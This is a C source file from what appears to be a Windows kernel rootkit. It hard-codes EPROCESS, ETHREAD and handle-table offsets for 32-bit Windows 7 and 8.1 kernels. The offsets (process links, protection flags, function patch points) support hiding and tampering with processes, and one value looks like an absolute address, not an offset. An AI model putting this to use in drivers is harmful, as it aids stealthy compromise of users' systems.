#include "common.h"


/*//////////////////////////////////////////////////////
//
//	File: rootkit_private_offsets
//
//	Goal: Store private dependent OS offsets
//
*///////////////////////////////////////////////////////


ROOTKIT_INTERNAL_DYNAMIC_DATA g_rootkit_dynamic_data = { 0 };


VOID rootkit_dynamic_data_thread(PVOID Context)
{
	ULONG majorversion = 0;
	ULONG minorversion = 0;
	ULONG build = 0;
	PROOTKIT_API_HASH Hash = NULL;

	Hash = (PROOTKIT_API_HASH)Context;

	__try
	{

		Hash->_PsGetVersion(&majorversion, &minorversion, &build, NULL);
		switch (minorversion)
		{
		case Windows_7:

			// 32-bit sys
			// PROCESS OFFSETS

			g_rootkit_dynamic_data.Pcb = 0x000;
			g_rootkit_dynamic_data.ProcessLock_Offset = 0x098;
			g_rootkit_dynamic_data.ImageFileName_Offset = 0x16c;
			g_rootkit_dynamic_data.CreateTime_Offset = 0x0a0;
			g_rootkit_dynamic_data.UniqueProcessId_Offset = 0x0b4;
			g_rootkit_dynamic_data.InheritedFromUniqueProcessId_Offset = 0x140;
			g_rootkit_dynamic_data.SectionObject_Offset = 0x128;
			g_rootkit_dynamic_data.ActiveProcessLinks_Offset = 0x0b8;
			g_rootkit_dynamic_data.ProtectedProcess_Offset = 0x26c;
			g_rootkit_dynamic_data.ProcessKernelTime_Offset = 0x088;
			g_rootkit_dynamic_data.ProcessUserTime_Offset = 0x08c;
			g_rootkit_dynamic_data.ObjectTable_Offset = 0x0f4;
			g_rootkit_dynamic_data.RundownProtect_Offset = 0x0b0;

			// THREAD OFFSETS

			g_rootkit_dynamic_data.ThreadListHead_Offset = 0x188;
			g_rootkit_dynamic_data.ThreadListEntry_Offset = 0x268;
			g_rootkit_dynamic_data.StartAddress_Offset = 0x218;
			g_rootkit_dynamic_data.CreateTimeThread_Offset = 0x200;
			g_rootkit_dynamic_data.ContextSwitches_Offset = 0x064;
			g_rootkit_dynamic_data.State_Offset = 0x068;
			g_rootkit_dynamic_data.KernelStackResident_Offset = 0x03c;
			g_rootkit_dynamic_data.WaitRegister_Offset = 0x038;
			g_rootkit_dynamic_data.ThreadUserTime_Offset = 0x1c4;
			g_rootkit_dynamic_data.ThreadKernelTime_Offset = 0x198;

			// FUNCTION OFFSETS

			g_rootkit_dynamic_data.IopCreateFile_First_Offset = 0xE8;
			g_rootkit_dynamic_data.IopCreateFile_Second_Offset = 0x5D;
			g_rootkit_dynamic_data.ObpCloseHandle_1_Offset = 0xE8;
			g_rootkit_dynamic_data.ObpCloseHandle_2_Offset = 0x5E;

			// SYSTEM INFORMATION PLUGIN OFFSETS

			g_rootkit_dynamic_data.KeMaximumIncrement = 0x18730;


			// HANDLE_TABLE

			g_rootkit_dynamic_data.HandleTableList_Offset = 0x010;
			g_rootkit_dynamic_data.HandleTableListHead_Offset = 0x89001d08;
			g_rootkit_dynamic_data.HandleCount_Offset = 0x030;


			break;

		case Windows_8:

			break;

		case Windows_81:


			// FUNCTION OFFSETS

			g_rootkit_dynamic_data.IopCreateFile_First_Offset = 0xE8;
			g_rootkit_dynamic_data.IopCreateFile_Second_Offset = 0x5D;
			g_rootkit_dynamic_data.ObpCloseHandle_1_Offset = 0xE8;
			g_rootkit_dynamic_data.ObpCloseHandle_2_Offset = 0x5E;

			// EPROCESS OFFSETS


			g_rootkit_dynamic_data.Pcb = 0x000;
			g_rootkit_dynamic_data.RundownProtect_Offset = 0x0b0;
			g_rootkit_dynamic_data.ProcessLock_Offset = 0x0a0;
			g_rootkit_dynamic_data.ActiveProcessLinks_Offset = 0x0b8;
			g_rootkit_dynamic_data.ImageFileName_Offset = 0x170;
			g_rootkit_dynamic_data.UniqueProcessId_Offset = 0x0b4;
			g_rootkit_dynamic_data.InheritedFromUniqueProcessId_Offset = 0x134;
			g_rootkit_dynamic_data.SectionObject_Offset = 0x11c;
			g_rootkit_dynamic_data.CreateTime_Offset = 0x0a8;
			g_rootkit_dynamic_data.ObjectTable_Offset = 0x150;

			// ETHREAD OFFSETS

			g_rootkit_dynamic_data.KernelStackResident_Offset = 0x058;
			g_rootkit_dynamic_data.ContextSwitches_Offset = 0x08c;
			g_rootkit_dynamic_data.ThreadListEntry_Offset = 0x39c;
			g_rootkit_dynamic_data.CreateTimeThread_Offset = 0x338;
			g_rootkit_dynamic_data.StartAddress_Offset = 0x350;
			g_rootkit_dynamic_data.ThreadListHead_Offset = 0x194;
			g_rootkit_dynamic_data.State_Offset = 0x090;
			g_rootkit_dynamic_data.WaitRegister_Offset = 0x054;

			// SYSTEM INFORMATION PLUGIN OFFSETS


			break;

		case Windows_10:

			break;
		default:
			break;
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		DbgPrint("\r\nCaught exception on dynamic data thread");
	}

	Hash->_PsTerminateSystemThread(STATUS_SUCCESS);
}

